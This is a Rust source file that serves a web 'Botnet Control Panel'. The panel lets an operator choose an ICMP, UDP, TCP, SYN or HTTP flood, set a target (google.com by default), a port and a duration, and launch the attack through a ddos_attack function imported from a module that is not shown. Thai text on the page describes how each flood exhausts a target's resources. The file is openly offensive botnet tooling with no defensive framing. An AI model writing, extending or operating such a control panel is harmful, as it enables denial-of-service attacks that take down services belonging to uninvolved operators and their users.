use warp::Filter;
use tokio::net::TcpListener;
use crate::attacks::ddos_attack;
use std::error::Error;

pub async fn run_web_frontend() -> Result<(), Box<dyn Error + Send + Sync>> {
    let index = warp::path::end().map(|| {
        warp::reply::html(r##"
        <html>
        <head>
        <title>Botnet Control</title>
        <style>
        body { font-family: Arial, sans-serif; background-color: #f4f4f4; margin: 0; padding: 20px; }
        .container { max-width: 800px; margin: auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        h1 { text-align: center; color: #333; }
        form { display: flex; flex-direction: column; }
        label { margin-top: 15px; font-weight: bold; }
        select, input { padding: 8px; margin-top: 5px; border: 1px solid #ccc; border-radius: 4px; }
        button { margin-top: 20px; padding: 10px; background-color: #d9534f; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
        button:hover { background-color: #c9302c; }
        .description { font-size: 0.9em; color: #666; margin-top: 5px; }
        .attack-descriptions { margin-top: 10px; }
        .attack-descriptions ul { list-style-type: none; padding: 0; }
        .attack-descriptions li { margin-bottom: 10px; }
        </style>
        </head>
        <body>
        <div class="container">
        <h1>Botnet Control Panel</h1>
        <p>Select attack type, enter target, and duration.</p>
        <form method="post" action="/send">
        <label for="attack_type">Attack Type:</label>
        <select id="attack_type" name="attack_type">
        <option value="icmp">ICMP Flood</option>
        <option value="udp">UDP Flood</option>
        <option value="tcp">TCP Flood</option>
        <option value="syn">SYN Flood</option>
        <option value="http">HTTP Flood</option>
        </select>
        <div class="attack-descriptions">
        <p><strong>ประเภทการโจมตี:</strong> เทคนิคการ DDoS (Distributed Denial of Service)</p>
        <ul>
        <li><strong>ICMP Flood:</strong> หรือ Ping Flood การส่ง ICMP echo requests จำนวนมากเพื่อใช้แบนด์วิดท์จนเต็ม</li>
        <li><strong>UDP Flood:</strong> การส่งแพ็กเก็ต UDP ไปยังพอร์ตสุ่มเพื่อให้เครื่องเป้าหมายเสียทรัพยากรในการตรวจสอบและตอบกลับ</li>
        <li><strong>TCP Flood:</strong> การส่งแพ็กเก็ต TCP จำนวนมหาศาลเพื่อรบกวนการเชื่อมต่อและใช้ทรัพยากรของเซิร์ฟเวอร์</li>
        <li><strong>SYN Flood:</strong> การส่งแพ็กเก็ต SYN ขอเชื่อมต่อแต่ไม่เสร็จสิ้น ทำให้เซิร์ฟเวอร์มี half-open connections จนทรัพยากรหมด</li>
        <li><strong>HTTP Flood:</strong> การส่งคำขอ HTTP (GET/POST) จำนวนมากเพื่อให้เว็บเซิร์ฟเวอร์ทำงานหนักจนล่ม</li>
        </ul>
        </div>
        <label for="target">Target:</label>
        <input id="target" name="target" value="google.com" oninput="autoSetPort()">
        <p class="description">เป้าหมาย: ใส่ชื่อโดเมนหรือที่อยู่ IP ของเป้าหมาย (เช่น google.com)</p>
        <label for="port">Port (for TCP/UDP/SYN):</label>
        <input id="port" name="port" value="80" type="number" min="1" max="65535">
        <p class="description">พอร์ตที่จะโจมตี (เช่น 80 สำหรับ HTTP, 443 สำหรับ HTTPS)</p>
        <label for="duration">Duration (seconds):</label>
        <input id="duration" name="duration" value="60" type="number" min="1">
        <p class="description">ระยะเวลาการโจมตีเป็นวินาที (เช่น 60 วินาที)</p>
        <button type="submit">Start Attack</button>
        </form>
        </div>
        <script>
        function autoSetPort() {
            const target = document.getElementById('target').value;
            const portInput = document.getElementById('port');
            if (target.startsWith('https://')) {
                portInput.value = 443;
            } else if (target.startsWith('http://')) {
                portInput.value = 80;
            } else if (target.includes(':')) {
                const parts = target.split(':');
                if (parts.length > 1) {
                    const port = parseInt(parts[parts.length - 1]);
                    if (!isNaN(port) && port > 0 && port <= 65535) {
                        portInput.value = port;
                    }
                }
            } else {
                // Default for plain domain/IP
                portInput.value = 80;
            }
        }
        autoSetPort();
        </script>
        </body>
        </html>
        "##)
    });

    let send = warp::path("send")
        .and(warp::post())
        .and(warp::body::form())
        .map(|form: std::collections::HashMap<String, String>| {
            let attack_type = form.get("attack_type").unwrap_or(&"tcp".to_string()).clone();
            let target = form.get("target").unwrap_or(&"".to_string()).clone();
            let port_str = form.get("port").unwrap_or(&"80".to_string()).clone();
            let port: u16 = port_str.parse().unwrap_or(80);
            let duration_str = form.get("duration").unwrap_or(&"60".to_string()).clone();
            let duration: u64 = duration_str.parse().unwrap_or(60);
            let attack_type_clone = attack_type.clone();
            let target_clone = target.clone();
            tokio::spawn(async move {
                ddos_attack(attack_type_clone, target_clone, port, duration).await;
            });
            let response_html = format!(r##"
            <html>
            <head><title>Attack Status</title></head>
            <body>
            <h1>Attack Started! / การโจมตีเริ่มแล้ว!</h1>
            <p>Type: {} / ประเภท: {}</p>
            <p>Target: {} / เป้าหมาย: {}</p>
            <p>Duration: {} seconds / ระยะเวลา: {} วินาที</p>
            <p id="countdown">Time remaining: {} seconds / เหลือเวลา: {} วินาที</p>
            <script>
            let timeLeft = {};
            const countdownEl = document.getElementById('countdown');
            const timer = setInterval(() => {{
                timeLeft--;
                countdownEl.textContent = 'Time remaining: ' + timeLeft + ' seconds / เหลือเวลา: ' + timeLeft + ' วินาที';
                if (timeLeft <= 0) {{
                    clearInterval(timer);
                    countdownEl.textContent = 'Attack completed! / การโจมตีเสร็จสิ้น!';
                }}
            }}, 1000);
            </script>
            <a href='/'>Back / กลับ</a>
            </body>
            </html>
            "##, attack_type, attack_type, target, target, duration, duration, duration, duration, duration);
            warp::reply::html(response_html)
        });

    let routes = index.or(send);
    let listener = TcpListener::bind("127.0.0.1:0").await?;
    let port = listener.local_addr()?.port();
    drop(listener);
    println!("Botnet web interface running on http://127.0.0.1:{}", port);
    warp::serve(routes).run(([127, 0, 0, 1], port)).await;
    Ok(())
}